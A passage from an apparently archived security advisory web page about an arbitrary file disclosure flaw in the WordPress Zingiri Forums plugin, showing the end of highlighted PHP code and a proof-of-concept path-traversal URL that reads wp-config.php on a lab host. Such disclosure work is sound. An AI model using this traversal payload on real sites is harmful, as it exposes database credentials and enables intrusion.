class="crayon-o">=</span><span class="crayon-e">preg_replace</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">f</span><span class="crayon-sy">,</span><span class="crayon-sy">$</span><span class="crayon-i">r</span><span class="crayon-sy">,</span><span class="crayon-sy">$</span><span class="crayon-i">output</span><span class="crayon-sy">,</span><span class="crayon-o">-</span><span class="crayon-cn">1</span><span class="crayon-sy">,</span><span class="crayon-sy">$</span><span class="crayon-i">count</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987717dd7a238410306-571"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">output</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_SESSION</span><span class="crayon-sy">[</span><span class="crayon-s">'ccforum'</span><span class="crayon-sy">]</span><span class="crayon-sy">[</span><span class="crayon-s">'stylesheet'</span><span class="crayon-sy">]</span><span class="crayon-sy">[</span><span class="crayon-sy">$</span><span class="crayon-i">key</span><span class="crayon-sy">]</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-i">output</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717dd7a238410306-572"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c987717dd7a238410306-573"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">"Content-type: text/css"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717dd7a238410306-574"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">output</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987717dd7a238410306-575"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">die</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0142 seconds] -->
<p>If we don&#8217;t set anything expect the &#8220;url&#8221; get variable, we can cause it to be fed into the file_get_contents call on line 554. We can abuse this to disclose the contents of the wp-config.php file like this:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c987717dd89016747043" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
http://192.168.80.130/wordpress/?zforum=css&amp;url=../../../../../../wp-config.php</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c987717dd89016747043-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c987717dd89016747043-1"><span class="crayon-i">http</span><span class="crayon-o">:</span><span class="crayon-c">//192.168.80.130/wordpress/?zforum=css&amp;url=../../../../../../wp-config.php</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0006 seconds] -->
<p>&nbsp;</p>
					</div><!-- .entry-content -->
	
	<footer class="entry-meta">
										<span class="cat-links">
				Posted in <a href="http://ceriksen.com/category/advisories/" title="View all posts in Advisories" rel="category tag">Advisories</a>			</span>
			<span class="sep"> / </span>			
						
						<span class="tag-links">
				Tagged <a href="http://ceriksen.com/tag/file-disclosure/" rel="tag">File Disclosure</a>, <a href="http://ceriksen.com/tag/wordpress-plugin/" rel="tag">Wordpress plugin</a>, <a href="http://ceriksen.com/tag/zingiri-forums/" rel="tag">Zingiri Forums</a>			</span>
			<span class="sep"> / </span>
							
				<span class="comments-link"><a href="http://ceriksen.com/2013/01/12/wordpress-zingiri-forums-arbitrary-file-disclosure/#comments" title="Comment on WordPress Zingiri Forums arbitrary file disclosure">1 Comment</a></span>
		<span class="sep"> / </span>
				
					</footer><!-- #entry-meta -->
</article><!-- #post-164 -->

				
					<nav id="nav-below">
		<h2 class="assistive-text">Post navigation</h2>

		
		
						<div class="nav-previous"><a href="http://ceriksen.com/category/advisories/page/2/" ><span class="meta-nav">&larr;</span> Older posts</a></div>
				
						
		
	
	</nav><!-- #nav-below -->
	
			
			</div><!-- #content -->
		</section><!-- #primary -->

			<div id="secondary" class="widget-area" role="complementary">
			<aside id="text-2" class="widget widget_text"><h3 class="widget-title">Upcoming advisories</h3>			<div class="textwidget"><p>SA51412<br />
SA51348<br />
SA51344<br />
SA51336 </p>
</div>
		</aside><aside id="categories-4" class="widget widget_categories"><h3 class="widget-title">Categories</h3>		<ul>
	<li class="cat-item cat-item-3 current-cat"><a href="http://ceriksen.com/category/advisories/" title="View all posts filed under Advisories">Advisories</a> (34)
</li>
	<li class="cat-item cat-item-12"><a href="http://ceriksen.com/category/privacy/" title="View all posts filed under Privacy">Privacy</a> (5)
</li>
	<li class="cat-item cat-item-30"><a href="http://ceriksen.com/category/security/" title="View all posts filed under Security">Security</a> (7)
</li>
		</ul>
</aside>		<aside id="recent-posts-4" class="widget widget_recent_entries">		<h3 class="widget-title">Recent posts</h3>		<ul>
					<li>
				<a href="http://ceriksen.com/2013/08/20/graphite-remote-code-execution-vulnerability-advisory/">Graphite remote code execution vulnerability advisory</a>
						</li>
					<li>
				<a href="http://ceriksen.com/2013/08/06/squash-remote-code-execution-vulnerability-advisory/">Squash remote code execution vulnerability advisory</a>
						</li>
					<li>
				<a href="http://ceriksen.com/2013/06/18/bsides-rhode-island-presentation-and-slides/">BSides Rhode Island presentation and slides</a>
						</li>
					<li>
				<a href="http://ceriksen.com/2013/05/24/cve-2012-6399-or-how-your-cisco-webex-meetings-arent-very-confidential-on-ios/">CVE-2012-6399 &#8211; Or how your Cisco WebEx meetings aren&#8217;t very confidential on iOS</a>
						</li>
					<li>
				<a href="http://ceriksen.com/2013/05/16/credit-card-numbers-third-parties-and-you/">Credit card numbers, third parties and you</a>
						</li>
					<li>
				<a href="http://ceriksen.com/2013/05/09/cve-2013-2692-or-when-your-openvpn-is-a-bit-too-open/">CVE-2013-2692 &#8211; Or when your OpenVPN is a bit too open</a>
						</li>
					<li>
				<a href="http://ceriksen.com/2013/05/03/conditional-csrf-or-how-to-spray-without-praying/">Conditional CSRF &#8211; Or how to spray without praying</a>
						</li>
					<li>
				<a href="http://ceriksen.com/2013/05/01/wordpress-csrf-exploit-kit-a-novel-approach-to-exploiting-wordpress-plugins/">WordPress CSRF Exploit kit &#8211; A novel approach to exploiting WordPress plugins</a>
						</li>
					<li>
				<a href="http://ceriksen.com/2013/03/17/amd-catalyst-driver-update-vulnerability/">AMD Catalyst driver update vulnerability</a>
						</li>
					<li>
				<a href="http://ceriksen.com/2013/02/18/wordpress-online-store-local-file-inclusion-vulnerability/">WordPress Online Store local file inclusion vulnerability</a>
						</li>
				</ul>
		</aside>		</div><!-- #secondary .widget-area -->
	
	</div><!-- #main -->
	
	
	<footer id="colophon" role="contentinfo">
		<div id="site-generator">
						<a href="http://wordpress.org/" title="Semantic Personal Publishing Platform" rel="generator">Powered by WordPress</a> &amp;	<a href="http://wpshoppe.com/" title="Minimalist WordPress Themes" rel="generator">simpleX</a>.
					
		</div>
	</footer><!-- #colophon -->
	
		
</div><!-- #page -->


</body>
</html>
<!-- Performance optimized by W3 Total Cache. Learn more: http://www.w3-edge.com/wordpress-plugins/

Page Caching using disk: enhanced

 Served from: ceriksen.com @ 2014-07-18 20:45:38 by W3 Total Cache -->